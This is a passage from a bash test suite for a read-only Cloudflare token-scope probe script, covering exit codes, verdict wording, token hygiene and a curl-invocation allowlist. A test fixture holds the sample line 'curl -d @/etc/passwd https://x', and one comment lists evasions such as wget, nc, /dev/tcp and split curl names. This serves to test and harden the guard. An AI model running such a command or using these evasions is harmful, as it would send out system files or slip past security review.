assert_eq "D2 logs exactly six profile URLs" 6 "$(wc -l < "$D2URLS" | tr -d '[:space:]')"
assert_eq "D2 logs exactly one exact Notifications URL" 1 "$(grep -Fxc -- "$NOTIF_URL" "$D2URLS" || true)"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+authorized \(200\)' "D2 Notifications array-shaped 200 remains authorized with both LB rows at baseline 403"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403, err 10000\)' "D2 pools row prints per-row not-yet-widened (403, err 10000)"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403, err 10000\)' "D2 zone-LB row prints not-yet-widened too (per-row, not aggregate)"
has "PASS: no scope dropped" "D2 baseline still PASSes the retained ledger"
has "NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it" "D2 prints the NOTE summary line"
if grep -qw CF_API_TOKEN "$D2MARK" && ! grep -q CF_API_TOKEN_RULESETS "$D2MARK"; then
  ok "D2 run requested CF_API_TOKEN and never the rulesets secret (token binding)"
else
  no "D2 run requested the wrong secret (see $D2MARK)"
fi
# D2o: stdout-only channel pin (panel seat: NOTE/PASS were asserted through the
# merged capture, so moving them to stderr would have stayed green).
MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D2o stdout-only baseline -> exit 0"
has "NOTE: LB scope not-yet-widened — expected BEFORE the #11181 widen; re-run with --expect-lb-scopes after it" "D2o NOTE line is on STDOUT"
has "PASS: no scope dropped" "D2o PASS line is on STDOUT"
lacks_err "NOTE: LB scope" "D2o NOTE is not on stderr"
# D2c mixed baseline (one authorized, one 403): per-row honesty; the set-level
# NOTE stands — accepted wording (data-integrity seat), assert mode gates per-row.
MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D2c mixed baseline exits 0 (neutrality is per-row)"
has_re 'accounts/<acct>/lb/pools[[:space:]]+authorized \(200\)' "D2c authorized pool row reads authorized"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened' "D2c missing zone row still reads not-yet-widened"
has "NOTE: LB scope not-yet-widened" "D2c mixed state still prints the NOTE (accepted; gated per-row in assert mode)"
unset MOCK_LB_POOLS MOCK_LB_ZONE MOCK_DOPPLER_MARKER MOCK_CURL_URLLOG

# --- D3: a RETAINED capability at 403 is never excused by the neutrality arm —
#         pinned PER ROW across all four retained arms (code-quality seat P2:
#         one-row witness left 3 of 4 rows open to a class-column drift). ---
for d3_var in MOCK_TUNNEL MOCK_ACCESS MOCK_DNS MOCK_NOTIF; do
  export "$d3_var=$LB403"   # export (not declare): the mock child must inherit it
  run "$MOCKPATH" --profile default-token
  assert_rc 3 "D3 retained 403 on $d3_var -> exit 3, neutrality never consults retained rows"
  unset "$d3_var"
done
lacks "PASS: no scope dropped" "D3 omits 'no scope dropped'"
# addendum 9: the zone-control diagnostic names a probe default-token never issues.
lacks "zone control" "D3 default-token failure prints no rulesets-only zone-control line"

# --- D3n: Notifications 404 is not neutralized by the two expected baseline LB 403s. ---
MOCK_NOTIF='404:{"success":false,"errors":[{"code":10404}]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3n Notifications 404 with expected LB baseline 403s -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+denied \(404, unverified — fail-closed\)' "D3n Notification 404 remains fail-closed"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3n account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3n zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3n Notifications 404 prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3s: only an HTTP 200 is authorized; a successful array body on 201 fails closed. ---
MOCK_NOTIF='201:{"success":true,"result":[]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3s Notifications 201 with an otherwise valid array -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+denied \(201\)' "D3s non-200 Notifications response is denied"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3s expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3s expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3s Notifications 201 prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3m: a degraded Notification 200 is not authorization. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":false,"result":[]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3m degraded Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3m degraded Notifications 200 is reported, not authorized"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3m expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3m expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3m degraded Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3w: a Notification 200 with an object result violates the account-array contract. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":true,"result":{"id":"synthetic-policy-id"}}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3w wrong-shape Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3w Notifications object result is rejected by the array contract"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3w expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3w expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3w wrong-shape Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D3we: an empty object is still the wrong result shape for this account list. ---
MOCK_OTHER='200:{"success":true,"result":[]}' MOCK_NOTIF='200:{"success":true,"result":{}}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 3 "D3we empty-object Notifications 200 -> exit 3"
has_re 'accounts/<acct>/alerting/v3/policies[[:space:]]+degraded \(200 body not success/array\)' "D3we empty object is rejected by the array contract"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403' "D3we expected account LB 403 remains baseline-neutral"
has_re 'zones/<zone>/load_balancers[[:space:]]+not-yet-widened \(403' "D3we expected zone LB 403 remains baseline-neutral"
lacks "PASS: no scope dropped" "D3we empty-object Notifications response prevents the retained-scope PASS"
unset MOCK_NOTIF MOCK_LB_POOLS MOCK_LB_ZONE

# --- D4: fail-closed layers hold on the new endpoints ---
MOCK_DNS='200:{"success":true,"result":null}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4a degraded 200 (result null) on a retained row -> exit 3"
unset MOCK_DNS
MOCK_LB_POOLS='200:{"success":true,"result":{"id":"x"}}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4b wrong-shape 200 (object on array endpoint) on a target row -> exit 3, never not-yet-widened"
lacks "not-yet-widened" "D4b wrong-shape prints no not-yet-widened row"
unset MOCK_LB_POOLS
MOCK_LB_POOLS='200:{"success":true,"result":null}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D4c result:null 200 on a target row (baseline) -> exit 3 (Guard 2 M4 spec literal)"
lacks "not-yet-widened" "D4c prints no not-yet-widened row for the degraded shape"
unset MOCK_LB_POOLS

# --- D5: baseline LB 404 is a HARD fail (403 is the only expected-missing status) ---
MOCK_LB_ZONE='404:{"success":false}' run "$MOCKPATH" --profile default-token
assert_rc 3 "D5 baseline LB 404 -> exit 3 (fail-closed; Guard 2 M1 detector)"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(404, unverified' "D5 names the failing row and its cause (per-row attribution)"
unset MOCK_LB_ZONE

# --- D6: assert mode with LB still 403 -> exit 3, FAIL line on STDOUT (addendum 1) ---
MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run_out "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D6 assert mode 403 -> exit 3"
has "FAIL: LB scope still absent — the widen was not applied to CF_API_TOKEN" "D6 FAIL verdict line present on stdout"
has_re 'accounts/<acct>/lb/pools[[:space:]]+denied \(403\)' "D6 per-row attribution: pools denied (403) on stdout"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(403\)' "D6 per-row attribution: zone-LB denied (403) on stdout"
lacks "PASS: LB scopes present" "D6 omits the present line"
has_err "FAIL: retained-scope probe failed" "D6 generic FAIL stays on stderr (stream contract unchanged)"
lacks_err "LB scope still absent" "D6 still-absent verdict is stdout-only (addendum 1)"
unset MOCK_LB_POOLS MOCK_LB_ZONE

# --- D7: assert mode green -> exit 0 + present line (no NOTE: presence is not absence) ---
run "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 0 "D7 assert mode both authorized -> exit 0"
has "PASS: LB scopes present — confirm the 403->present transition against your pre-widen baseline" "D7 prints the present line"

# --- D8: half-green assert -> exit 3 (per-row gating) ---
MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D8 assert mode one-of-two 403 -> exit 3 (per-row)"
has_re 'zones/<zone>/load_balancers[[:space:]]+denied \(403\)' "D8 names the blocking row (pools stays authorized)"
unset MOCK_LB_ZONE

# --- D2b: Guard 2 H2 (must-PASS): post-widen baseline, both LB authorized -> 0, no NOTE ---
run "$MOCKPATH" --profile default-token
assert_rc 0 "D2b baseline with LB already authorized -> exit 0 (neutrality is for absence, not presence)"
lacks "NOTE: LB scope not-yet-widened" "D2b prints no NOTE when the scopes are present"

# --- D14: assert-mode degraded-200 must NOT claim "still absent" wording (addendum 2:
#          the still-absent line is minted only for a real 403). ---
MOCK_LB_POOLS='200:{"success":false,"result":[]}' run_out "$MOCKPATH" --profile default-token --expect-lb-scopes
assert_rc 3 "D14 assert-mode degraded-200 -> exit 3"
lacks "FAIL: LB scope still absent" "D14 degraded-200 never asserts the still-absent cause"

# --- D9: usage errors exit 2 BEFORE any secret read (addendum 6: --profile mirrors
#          the --target-entrypoint missing-value arm shape). ---
: >"$DOPREQ"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile default-token
assert_rc 0 "D9pc positive control: a valid run DOES reach Doppler"
if [[ -s "$DOPREQ" ]]; then ok "D9pc marker mechanism live (D9's negatives are not vacuous)"; else no "D9pc marker never written — D9 negatives would pass vacuously"; fi
: >"$DOPREQ"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile bogus --dry-run
assert_rc 2 "D9a unknown profile -> exit 2"
lacks "# dry-run" "D9a unknown profile prints no recipes (the '# dry-run' block never starts)"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile default-token --target-entrypoint http_config_settings
assert_rc 2 "D9b default-token + --target-entrypoint -> exit 2"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile rulesets --expect-lb-scopes
assert_rc 2 "D9c rulesets + --expect-lb-scopes -> exit 2"
MOCK_DOPPLER_MARKER="$DOPREQ" run "$MOCKPATH" --profile
assert_rc 2 "D9d --profile with no value -> exit 2"
if [[ ! -s "$DOPREQ" ]]; then ok "D9 all four usage errors precede any Doppler read"; else no "D9 a usage error reached Doppler first"; fi

# --- D-mint: empty CF_API_TOKEN -> exit 2 naming the secret ---
MOCK_API_TOKEN='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-mint empty CF_API_TOKEN -> exit 2"
has "CF_API_TOKEN is empty or absent" "D-mint message names CF_API_TOKEN"

# --- D10: explicit --profile rulesets dry-run == no-flag dry-run (back-compat) ---
run "$MOCKPATH" --dry-run
cp "$OUTFILE" "$WORK/noflag.txt"
run "$MOCKPATH" --profile rulesets --dry-run
if cmp -s "$WORK/noflag.txt" "$OUTFILE"; then ok "D10 --profile rulesets dry-run identical to no-flag"; else no "D10 explicit rulesets dry-run diverged from no-flag"; fi

# --- D11: parameterized table-size pins (Guard 1 M3 detector; never a hard-coded 6) ---
run "$MOCKPATH" --dry-run
assert_eq "D11a rulesets prints exactly 5 curl recipes" 5 "$(count_f 'curl --disable')"
run "$MOCKPATH" --target-entrypoint http_request_transform --dry-run
assert_eq "D11b rulesets +target prints 6" 6 "$(count_f 'curl --disable')"
run "$MOCKPATH" --profile default-token --dry-run
assert_eq "D11c default-token prints exactly 6" 6 "$(count_f 'curl --disable')"

# --- D-e: orthogonal flags: assert flag with dry-run prints rows once, exit 0 ---
run "$MOCKPATH" --profile default-token --expect-lb-scopes --dry-run
assert_rc 0 "D-e expect+dry-run orthogonal -> exit 0"
assert_eq "D-e rows printed once" 6 "$(count_f 'curl --disable')"

# Table parses shared by D-conf and D-pc (parameterized — never literal 6/5/6).
PROF_DECL="$(sed -n 's/^PROFILES=(\(.*\))$/\1/p' "$SUT" | head -1)"
ZP_N="$(sed -n 's/^ZONE_PHASES=(\(.*\))$/\1/p' "$SUT" | head -1 | wc -w | tr -d '[:space:]')"
DT_N="$(awk '/^DT_ROWS=\(/ {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ {c++} END {print c+0}' "$SUT")"
# Migration-profile tables (#12931): rows counted from the SUT's own arrays.
tbl_n() { awk -v t="$1" '$0 ~ "^"t"=\\(" {f=1; next} f && /^\)/ {f=0} f && /^[[:space:]]*"/ {c++} END {print c+0}' "$SUT"; }
MW_RD_N="$(tbl_n MIG_WRITE_REDIRECTS_DNS)"; MC_RD_N="$(tbl_n MIG_CTRL_REDIRECTS_DNS)"
MW_ZR_N="$(tbl_n MIG_WRITE_ZONE_REST)";     MC_ZR_N="$(tbl_n MIG_CTRL_ZONE_REST)"

# --- D-conf: run-path CONFINEMENT pin (security seat P2): every EXECUTED curl
#          carries the #7873 confined form and the token value never rides argv.
#          The dry-run recipe literal was pinned since C8; the run path was not. ---
DARGV="$WORK/d-conf-argv.log"
MOCK_CURL_ARGV="$DARGV" run "$MOCKPATH" --profile default-token
assert_rc 0 "D-conf default-token run -> exit 0"
dargv_lines="$(wc -l < "$DARGV" | tr -d '[:space:]')"
assert_eq "D-conf one argv record per probe ($DT_N rows)" "$DT_N" "$dargv_lines"
DNP_BAD_ROWS="$(awk '
  {
    n = 0; star = 0; equals_form = 0
    for (i = 1; i <= NF; i++) {
      if ($i == "--noproxy") {
        n++
        if ($(i + 1) == "\\*") star++
      }
      if ($i ~ /^--noproxy=/) equals_form = 1
    }
    if (n != 1 || star != 1 || equals_form) bad++
  }
  END { print bad + 0 }
' "$DARGV")"
if [[ "$(grep -c -- '--disable' "$DARGV")" -eq "$DT_N" ]] \
   && [[ "$DNP_BAD_ROWS" -eq 0 ]] \
   && grep -q -- '-H @/dev/fd/' "$DARGV" \
   && ! grep -Eq -- '(^|[[:space:]])(--proxy|--proxy1\.0|--preproxy|--socks4a?|--socks5(-hostname)?)(=|[[:space:]]|$)|(^|[[:space:]])-x[^[:space:]]*([[:space:]]|$)|(^|[[:space:]])-[^-][^[:space:]]*x[^[:space:]]*([[:space:]]|$)' "$DARGV" \
   && ! grep -q -- 'xyz789' "$DARGV"; then
  ok "D-conf every probe confined (no proxy override), header via @/dev/fd, token never on argv"
else
  no "D-conf run-path confinement, proxy policy, or argv hygiene broken (see $DARGV)"
fi

# --- D-pc: PROFILES enumeration pin (Guard 1 M3 detector; parameterized from the
#          script's OWN tables, never literal 5/6/6 — panel seats P2). ---
if [[ -n "$PROF_DECL" ]]; then ok "D-pc PROFILES declares at least one profile (positive control)"; else no "D-pc PROFILES parse empty — enumeration below is vacuous"; fi
for dpc_p in $PROF_DECL; do
  case "$dpc_p" in
    rulesets)       dpc_want=$((ZP_N + 1)) ;;
    default-token)  dpc_want="$DT_N" ;;
    # every write row prints a deny-control recipe AND a grant recipe
    redirects-dns)  dpc_want=$((MC_RD_N + 2 * MW_RD_N)) ;;
    zone-rest)      dpc_want=$((MC_ZR_N + 2 * MW_ZR_N)) ;;
    *)              dpc_want=-1 ;;
  esac
  run "$MOCKPATH" --profile "$dpc_p" --dry-run
  assert_rc 0 "D-pc dry-run for profile $dpc_p -> exit 0"
  assert_eq "D-pc profile $dpc_p prints exactly its declared table ($dpc_want rows)" "$dpc_want" "$(count_f 'curl --disable')"
done
if [[ "$DT_N" -ge 2 ]]; then ok "D-pc default-token table declares >=2 target rows (assert mode has something to assert)"; else no "D-pc DT_ROWS under-declared"; fi

# --- D-x: xtrace refusal BEHAVIORAL (panel seat: previously only source-grepped). ---
XTLOG="$WORK/d-x-urls.log"
: >"$XTLOG"
( MOCK_CURL_URLLOG="$XTLOG" PATH="$MOCKPATH" "$BASHBIN" -x "$SUT" --profile default-token >"$WORK/d-x.out" 2>/dev/null )
RC=$?
assert_rc 78 "D-x running under bash -x -> exit 78 refusal"
if [[ ! -s "$XTLOG" ]]; then ok "D-x refusal issues no probe"; else no "D-x probed under xtrace!"; fi
if grep -qF -- "refusing to run under xtrace" "$WORK/d-x.out"; then ok "D-x refusal prints its FAIL verdict on stdout"; else no "D-x refusal printed no verdict line"; fi

# --- D-id: the ZONE/ACCT id acquisition is pinned too (the substitution D2 guards
#          depends on it; MOCK_ZONE/MOCK_ACCTID arms previously never exercised). ---
MOCK_ZONE='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-id empty CF_ZONE_ID -> exit 2"
has "CF_ZONE_ID is empty or absent" "D-id message names CF_ZONE_ID"
MOCK_ACCTID='' run "$MOCKPATH" --profile default-token
assert_rc 2 "D-idb empty CF_ACCOUNT_ID -> exit 2"
has "CF_ACCOUNT_ID is empty or absent" "D-idb message names CF_ACCOUNT_ID"

# --- D-charset: the --target-entrypoint refusal is user-reachable and must be
#          tested (architecture seat P3: every prior test value PASSED the gate). ---
run "$MOCKPATH" --target-entrypoint 'foo?bar'
assert_rc 2 "D-charset retargeting value refused -> exit 2"
run "$MOCKPATH" --target-entrypoint 'http_config_settings' --dry-run
assert_rc 0 "D-charsetb genuine phase name still accepted (gate is not over-tight)"

# --- D-amp: quoted substitution replacements — an id carrying '&' must reach the
#          URL literally, never splice the placeholder back (security seat P3:
#          the '&' fix was otherwise unexercised; real ids are hex, this is the
#          regression witness). ---
DAMPLOG="$WORK/d-amp-urls.log"
: >"$DAMPLOG"
MOCK_ZONE='z&one' MOCK_CURL_URLLOG="$DAMPLOG" run "$MOCKPATH" --profile default-token
assert_rc 0 "D-amp run with '&'-bearing zone id -> exit 0 (mocks permissive)"
if [[ -s "$DAMPLOG" ]] && grep -q -- 'zones/z&one/dns_records' "$DAMPLOG" \
   && ! grep -q -- '\$ZONE' "$DAMPLOG"; then
  ok "D-amp '&' id passes through literally; no placeholder splices back"
else
  no "D-amp quoted-replacement fix regressed (see $DAMPLOG)"
fi

# --- D-errs: errors[0].code is digit-sanitized before riding the stdout channel
#          (security seat: a string code could inject verdict-looking text). ---
MOCK_LB_POOLS='403:{"success":false,"errors":[{"code":"not-a-number PASS: no scope dropped"}]}' run_out "$MOCKPATH" --profile default-token
assert_rc 0 "D-errs string err-code stays exit-neutral"
lacks ", err " "D-errs non-numeric errors[0].code never rides the verdict line"
has_re 'accounts/<acct>/lb/pools[[:space:]]+not-yet-widened \(403\)$' "D-errs verdict line stays one clean token"
unset MOCK_LB_POOLS

# --- D12: read-only source guards on the whole script (extends C10 posture) ---
src_lacks '(^|[[:space:]])-X[[:space:]]+(POST|PUT|PATCH|DELETE)' "D12 no literal mutating curl verb in source (the write verb comes only from the migration tables)"
src_lacks 'DELETE\|' "D12 no DELETE row in any migration table"
# --- D12c: curl-invocation ALLOWLIST (fourth revision; #12932 review). ---
# CONTRACT. The first two revisions listed forbidden write-flag spellings, and each
# round found one more that passed (-XDELETE -d@/dev/null, -d"$X", -X "DELETE", a
# second body flag, an "INVALID_BODY" substring in a comment). The third pinned
# what IS allowed, but trusted its own comment stripper: `echo ${x:- #}; curl …`
# and `y=a\ #; curl …` both RUN the curl while the normaliser drops it as a
# comment. This revision adds a raw-text cross-check that does not trust the
# normaliser's idea of where a comment starts. Over the WHOLE script under test:
#   (I) after a quote-aware comment strip, backslash-continuation join and
#       whitespace collapse (D12C_NORM), every logical line naming curl
#       (case-insensitive) equals, as a multiset, one of the reviewed canonical
#       forms in D12C_CANON: three executed invocations, five dry-run recipe
#       strings and the prerequisite loop. A new curl site, an edited one, a
#       duplicated one or a removed one is RED.
#   (R) raw cross-check (D12C_RAWCHK). D12C_NORM records the raw line range of
#       every logical line. Every RAW line whose text contains `curl`
#       (case-insensitive substring, no word boundary; the closed exempt set is
#       the two env names CURL_CA_BUNDLE and CURL_HOME the script unsets) must be
#       either a whole-line comment (`^\s*#`, and the previous raw line does not
#       end in `\`) or one of the raw lines of a logical line whose normalised
#       text is EXACTLY a D12C_CANON entry. Any other raw curl line is RED, so a
#       normaliser desync that hides a curl as a comment reds here.
#   (S) the same cross-check on a copy with every ' " and \ deleted, which
#       catches a name split by quotes or a backslash (`cu""rl`, `cur\l`).
#   (F) a LINT of D12C_CANON, not an independent check of the script: every
#       canonical form uses only the read flags --disable --noproxy -sS
#       --max-time -w -H, plus -X and --data-binary as a PAIR: -X takes only the
#       table variable ("$method" / $w_method) and the one body is exactly
#       --data-binary "$INVALID_BODY". (I) makes the script's curl lines equal
#       to D12C_CANON, so (F) on the canon covers the script; its mutants are
#       applied to a copy of D12C_CANON.
#   (U) the curl mock refuses any flag it does not model (logs UNMODELLED, exit
#       64), and U1 at the end of the suite asserts no run in this file hit that.
# RESIDUALS, left to review:
#   - a curl name split at parse time by something other than ' " \ (`c${e}url`,
#     `c$()url`, `$'\x63'url`); (S) covers only the quote and backslash shapes;
#   - non-curl HTTP clients (wget, nc, /dev/tcp, a python/node/perl runtime);
#   - curl reached indirectly: a name assembled at run time, eval of a string,
#     a variable holding the command, a sourced file, a second script or a
#     heredoc fed to an interpreter (a heredoc is inventoried line by line only);
#   - a desync that turns a raw curl line into part of a logical line whose
#     normalised text is EXACTLY a canonical form (the range is then trusted);
#   - the VALUES of $method and $INVALID_BODY (pinned by D12, M0, M1 and the
#     SUT's own table tripwire, not here); curl behaviour from outside argv (the
#     canonical forms carry --disable and --noproxy '*', nothing more); and
#     whether a canonical form is itself safe, which is the review that accepted
#     it into D12C_CANON. Changing D12C_CANON is a reviewed act, not a refresh.
D12C_NORM="$WORK/d12c-norm.awk"
cat >"$D12C_NORM" <<'AWK'
function top() { return d ? st[d] : "" }
function flush() { gsub(/[ \t]+/, " ", buf); sub(/^ /, "", buf); sub(/ $/, "", buf); if (buf != "") print start "\t" NR "\t" buf; buf = ""; start = 0 }
hd != "" { if ($0 ~ ("^\t*" hd "$")) { hd = ""; next } x = $0; gsub(/[ \t]+/, " ", x); print NR "\t" NR "\theredoc: " x; next }
{
  line = $0; out = ""; n = length(line); i = 1; cont = 0
  if (start == 0) start = NR
  while (i <= n) {
    c = substr(line, i, 1); t = top()
    if (t == "sq") { out = out c; if (c == "'") d--; i++; continue }
    if (c == "\\") { if (i == n) { cont = 1; i++; continue } out = out c substr(line, i + 1, 1); i += 2; continue }
    if (c == "$" && substr(line, i + 1, 1) == "(") { st[++d] = "cs"; out = out "$("; i += 2; continue }
    if (t == "dq") { out = out c; if (c == "\"") d--; i++; continue }
    if (c == "'") { st[++d] = "sq"; out = out c; i++; continue }
    if (c == "\"") { st[++d] = "dq"; out = out c; i++; continue }
    if (c == "(") { st[++d] = "cs"; out = out c; i++; continue }
    if (c == ")") { if (t == "cs") d--; out = out c; i++; continue }
    if (c == "#" && (i == 1 || substr(line, i - 1, 1) ~ /[ \t;|&(]/)) break
    out = out c; i++
  }
  buf = buf out " "
  if (cont || d > 0) next
  if (match(buf, /(^|[^<])<<-?[ ]*['"]?[A-Za-z_][A-Za-z0-9_]*['"]?/)) { h = substr(buf, RSTART, RLENGTH); sub(/^[^<]*<<-?[ ]*['"]?/, "", h); sub(/['"]$/, "", h); hd = h }
  flush()
}
END { if (d > 0 || hd != "" || buf != "") print "0\t0\tPARSE-ERROR unbalanced quote/substitution/heredoc at EOF" }
AWK
# The flag allowlist (F). Input: one logical line per row. Prints each offending row.
D12C_FLAGS="$WORK/d12c-flags.awk"
cat >"$D12C_FLAGS" <<'AWK'
$0 == "for bin in curl doppler jq; do" { next }
{
  s = $0; p = match(tolower(s), /curl/); if (!p) { print "no-curl-word: " $0; next }
  s = substr(s, p + 4); gsub(/\\"/, "\"", s); gsub(/\\\$/, "$", s)
  n = split(s, w, " "); bad = ""; nx = 0; nb = 0
  for (k = 1; k <= n; k++) {
    if (w[k] !~ /^-/) continue
    if (w[k] ~ /^(--disable|--noproxy|-sS|--max-time|-w|-H)$/) continue
    if (w[k] == "-X") { nx++; if (w[k + 1] != "\"$method\"" && w[k + 1] != "$w_method") bad = bad " -X<" w[k + 1] ">"; continue }
    if (w[k] == "--data-binary") { nb++; if (w[k + 1] != "\"$INVALID_BODY\"") bad = bad " body<" w[k + 1] ">"; continue }
    bad = bad " flag<" w[k] ">"
  }
  if (nx > 1 || nb > 1 || nx != nb) bad = bad " -X/--data-binary not exactly one pair (" nx "/" nb ")"
  if (bad != "") print bad " :: " $0
}
AWK
D12C_CANON="$WORK/d12c-canon.txt"
cat >"$D12C_CANON" <<'CANON'
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$c_key")\") $(mig_url "$c_url")"
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -X $w_method -H 'Content-Type: application/json' --data-binary \"\$INVALID_BODY\" -H @<(printf 'Authorization: Bearer %s' \"\$$(mig_key "$w_key")\") $(mig_url "$w_url")"
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $r_url"
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/zones/\$ZONE/rulesets/phases/$p/entrypoint"
printf '%s\n' "curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $API/accounts/\$ACCT/rulesets"
for bin in curl doppler jq; do
resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "$TOK") "$url" 2>/dev/null || true)"
resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2>/dev/null || true)" ;;
resp="$(curl --disable --noproxy '*' -sS --max-time 15 -w '\n%{http_code}' -X "$method" -H 'Content-Type: application/json' --data-binary "$INVALID_BODY" -H @<(printf 'Authorization: Bearer %s' "${MIG_TOK[$key]}") "$url" 2>/dev/null || true)" ;;
CANON
# The raw cross-check (R/S). Input files: ranges ("start end" per canonical logical
# line), then the raw script. -v strip=1 deletes ' " \ before the curl match.
D12C_RAWCHK="$WORK/d12c-rawchk.awk"
cat >"$D12C_RAWCHK" <<'AWK'
FILENAME == ARGV[1] { for (k = $1; k <= $2; k++) cov[k] = 1; next }
{
  pc = prevc; com = ($0 ~ /^[ \t]*#/) && !pc; prevc = !com && ($0 ~ /\\$/)
  s = $0; if (strip) gsub(/['"\\]/, "", s)
  gsub(/(^|[^A-Za-z0-9_])CURL_(CA_BUNDLE|HOME)([^A-Za-z0-9_]|$)/, " ", s)
  if (tolower(s) !~ /curl/ || com || (FNR in cov)) next
  print FNR ": " $0
}
AWK
# d12c_curl_lines <script> <out>: the normalised logical lines that name curl.
d12c_curl_lines() {
  awk -f "$D12C_NORM" "$1" >"$2.all"
  grep -iE -- '(^|[^A-Za-z0-9_.-])curl([^A-Za-z0-9_.-]|$)|PARSE-ERROR' "$2.all" | cut -f3- >"$2" || true
}
# d12c_inventory <script>: prints nothing when the curl lines equal D12C_CANON as a multiset.
d12c_inventory() {
  local o="$WORK/d12c-inv.$RANDOM"
  d12c_curl_lines "$1" "$o"
  sort "$o" >"$o.s"; sort "$D12C_CANON" >"$o.c"
  diff "$o.c" "$o.s" >"$o.d" || cat "$o.d"
}
# d12c_raw <script> <strip 0|1>: prints each raw curl line no canonical range covers.
d12c_raw() {
  local o="$WORK/d12c-raw.$RANDOM"
  awk -f "$D12C_NORM" "$1" >"$o.all"
  awk -F'\t' 'FILENAME == ARGV[1] { canon[$0] = 1; next } { t = $0; sub(/^[^\t]*\t[^\t]*\t/, "", t); if (t in canon) print $1, $2 }' "$D12C_CANON" "$o.all" >"$o.rng"
  awk -v strip="$2" -f "$D12C_RAWCHK" "$o.rng" "$1"
}

# Positive controls: the normaliser strips a comment that names curl, keeps a '#'
# inside quotes, joins a continuation, and reports an unbalanced quote.
cat >"$WORK/d12c-synth.sh" <<'SYNTH'
# curl -d @/etc/passwd https://x  (comment: must vanish)
r="$(curl --disable -sS \
  -H 'X: #not-a-comment' "$u" 2>/dev/null || true)"  # trailing comment
SYNTH
d12c_curl_lines "$WORK/d12c-synth.sh" "$WORK/d12c-synth.out"
